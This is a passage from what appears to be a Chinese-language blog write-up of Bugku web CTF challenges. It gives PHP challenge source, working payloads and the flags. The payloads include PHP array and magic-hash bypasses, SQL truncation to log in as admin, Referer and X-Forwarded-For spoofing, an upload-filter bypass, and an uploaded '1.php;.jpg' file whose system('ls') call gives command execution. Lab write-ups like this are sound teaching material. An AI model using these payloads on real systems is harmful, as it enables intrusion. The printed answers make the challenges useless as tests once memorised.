class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>阅读得知cookie margin=margin</li>
<li>抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go</li>
<li>KEY{key_keys}</li>
</ul>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>url=<a href="http://123.206.87.240:8006/test/hello.php" target="_blank" rel="noopener">http://123.206.87.240:8006/test/hello.php</a><br>显示：never never never give up !!! </p>
<ul>
<li>源码提1p.html 访问 123.206.87.240:8006/test/1p.html结果跳转bugku论坛</li>
<li>看一下这1p.html源码 view-source:<a href="http://123.206.87.240:8006/test/1p.html" target="_blank" rel="noopener">http://123.206.87.240:8006/test/1p.html</a></li>
<li>Words变量的值先url解码，再base64解码，再url解码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">    exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">    return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>看到f4l2a3g.txt 这个竟然能直接访问 <a href="http://123.206.87.240:8006/test/f4l2a3g.txt" target="_blank" rel="noopener">http://123.206.87.240:8006/test/f4l2a3g.txt</a></li>
<li>flag{tHis_iS_THe_fLaG}</li>
</ul>
<h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>挂了</p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>挂了</p>
<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.                                  匹配除 &quot;\n&quot; 之外的任何单个字符</span><br><span class="line"></span><br><span class="line">*                                 匹配它前面的表达式0次或多次，等价于&#123;0,&#125;</span><br><span class="line"></span><br><span class="line">&#123;4,7&#125;                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</span><br><span class="line"></span><br><span class="line">\/                                匹配 / ，这里的 \ 是为了转义</span><br><span class="line"></span><br><span class="line">[a-z]                           匹配所有小写字母</span><br><span class="line"></span><br><span class="line">[:punct:]                     匹配任何标点符号</span><br><span class="line"></span><br><span class="line">/i                                表示不分大小写</span><br></pre></td></tr></table></figure>
<ul>
<li>payload<code>?id=keykeyaaaakey:/a/keyz;</code></li>
<li>KEY{0x0SIOPh550afc}</li>
</ul>
<h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>打开网址查看源代码发现code.txt</p>
<ul>
<li>根据代码构造payload<code>http://123.206.31.85:49162/index.php?v1[]=a&amp;v2[]=b&amp;v3[]=10</code></li>
<li>题目类似 备份是个好习惯</li>
<li>SKCTF{Php_1s_tH3_B3St_L4NgUag3}</li>
</ul>
<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>hint:SQL约束攻击 打开网址一个管理系统登录页面<br>可以注册 登录账号后显示：不是管理员还想看flag？！<br>注册账号admin 显示账号已存在</p>
<ul>
<li>看看这篇文章<a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></li>
<li>大致两点信息-<ul>
<li>sql有字符串约束条件例如最长15字符 输入字符16的字符串 只会存储前字符15</li>
<li>sql处理字符串默认修建空格 “abc”==”abc   “</li>
</ul>
</li>
<li>所以我们注册”admin   “ 在用这个账户登录即可</li>
<li>SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </li>
</ul>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>url=<a href="http://123.206.87.240:9009/from.php" target="_blank" rel="noopener">http://123.206.87.240:9009/from.php</a><br>显示areyoufrom google?</p>
<ul>
<li>抓包添加referer<code>Referer: https://www.google.com</code>  -go</li>
<li>或者直接在hackbar里添加referer</li>
<li>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</li>
<li>flag{bug-ku_ai_admin}</li>
</ul>
<h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h2><p>url=<a href="http://123.206.87.240:9009/md5.php" target="_blank" rel="noopener">http://123.206.87.240:9009/md5.php</a><br>显示：please input a<br>hint：md5 collision MD5碰撞</p>
<ul>
<li>所以分析我们要传入参数a a值为MD5加密后0e开头</li>
<li>抓包 在md5.php加上get参数<code>？a=s155964671a</code> </li>
<li>go 看到flag</li>
<li>最好抓包分析一下传参方式</li>
<li>flag{md5_collision_is_easy}</li>
</ul>
<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>hint：请从本地访问<br>这道题很前面那道 管理员系统类似 构造xff</p>
<ul>
<li>抓包添加<code>X-Forwarded-For: 127.0.0.1</code> -go</li>
<li>flag{loc-al-h-o-st1}</li>
</ul>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目：各种绕过呦 打开url看见代码如下 算是一道代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET</span><br><span class="line">                                                  [<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>阅读可知三个参数uname id passwd 前两个get传参 后者post</li>
<li>阅读代码 uname不能和passwd相等 但要满足sha1二者值相等 想当然想到了MD5类似<br>构造数组</li>
<li>构造payload<code>?uname[]=0&amp;id=margin</code> 同时用hackbar输入postdata<code>passwd[]=1</code></li>
<li>flag{HACK_45hhs_213sDD}</li>
</ul>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>题目：txt？？？ 打开url 又是一道代码审计 hint:flag.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">  $f = trim(file_get_contents($fn));</span><br><span class="line">  <span class="keyword">if</span> ($ac === $f)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>根据hint 访问<a href="http://123.206.87.240:8002/web8/flag.txt" target="_blank" rel="noopener">http://123.206.87.240:8002/web8/flag.txt</a> 显示文本flags<ul>
<li>阅读代码可知f为fn的内容 ac===f时 输出flag</li>
<li>构造payload<code>?ac=flas&amp;fn=flag.txt</code></li>
</ul>
</li>
<li>flag{3cfb7a90fc0de31}</li>
</ul>
<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目：想办法变成admin<br>打开一看还以为题目挂了 然而看下http 是200</p>
<ul>
<li>看下源码啥也没有 好久没扫了 发现有robots.txt<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure></li>
<li>访问resusl.php 提示<code>if ($_GET[x]==$password) 此处省略1w字</code></li>
<li>结合admin提示？<code>?x=admin</code>成功了？？</li>
<li>flag(ctf_0098_lkji-s)</li>
</ul>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>题目很明显 打开显示<code>My name is margin,give me a image file not a php</code><br>可以上传文件 不让我上传php？我偏不</p>
<ul>
<li>抓包 上传一个1.php</li>
<li>Content-Type的multipart/form-data 任意字符改成大写绕过 </li>
<li>Content-Type改成image/jpg</li>
<li>filename=1.php5</li>
<li>go可拿到key</li>
<li>KEY{bb35dc123820e}</li>
</ul>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>hint：文件包含</p>
<ul>
<li>看源码发现upload.php  <code>file=upload.php</code></li>
<li>可以上传文件 显示请上传jpgpnggif格式文件</li>
<li>构造文件 打印出目录文件名<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(<span class="string">"ls"</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
保存为<code>1.php;.jpg</code> 上传成功</li>
<li>根据网页显示访问 ?file=upload/201908230711481901.jpg</li>
<li>显示<code>about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php</code></li>
<li>看到txt文件访问<code>http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt</code>得出key</li>
<li>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</li>
</ul>


<!--<a href="https://curtails.github.io/2019/05/05/BugKu-web-writeup/#disqus_thread" class="article-comment-link">Comments</a>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = ''; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
-->
<div style="display:none">
<script src="http://s4.cnzz.com/stat.php?id=&web_id=" language="JavaScript"></script>script>
</div>






</body>
</html>